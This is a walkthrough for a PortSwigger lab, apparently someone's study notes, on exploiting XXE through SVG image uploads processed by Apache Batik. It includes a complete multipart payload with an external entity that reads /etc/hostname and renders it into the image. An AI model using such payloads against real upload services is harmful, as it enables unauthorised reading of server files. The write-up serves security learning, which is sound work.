# Exploiting XXE via image file upload

[Lab in PortSwigger](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)

## Definition
Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG.

For example, an application might allow users to upload images, and process or validate these on the server after they are uploaded. Even if the application expects to receive a format like PNG or JPEG, the image processing library that is being used might support SVG images. Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities.

## Notes
This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.
To solve the lab, upload an image that displays the contents of the `/etc/hostname` file after processing. Then use the `Submit solution` button to submit the value of the server hostname.

**Bypassing Filetype Validation**
A valid `SVG` file with the content-type `image/svg+xml` does the job.

**Malicious Payload**
```http
Content-Disposition: form-data; name="avatar"; filename="avatar.svg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg
   xmlns:dc="http://purl.org/dc/elements/1.1/"
   xmlns:cc="http://creativecommons.org/ns#"
   xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd"
   xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"
   width="128"
   height="96"
   version="1.1"
   id="svg4"
   sodipodi:docname="users.svg"
   inkscape:version="0.92.4 (5da689c313, 2019-01-14)">
<text x="0" y="15" fill="red">PWN &xxe;</text>
</svg>
```
The dimension of the SVG canvas is important because the server-side converts the SVG into a PNG thumbnail of 128x96. If the canvas is too big the final text will be very small and unreadable.

**Getting the Hostname**  
Just download the `PNG` version on comments page.

## Key Words
> file upload, xml, xxe